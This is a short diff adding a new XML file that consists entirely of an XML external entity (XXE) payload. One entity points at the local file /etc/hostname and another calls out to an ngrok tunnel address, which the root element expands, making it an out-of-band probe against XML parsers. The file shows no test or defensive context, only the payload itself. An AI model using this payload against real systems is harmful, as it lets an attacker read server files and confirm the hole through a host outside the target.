@@ -1,0 +1,5 @@
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+  <!ENTITY leak SYSTEM "https://66424e442b1c.ngrok-free.app/">
+]>
+<root>&leak;</root>
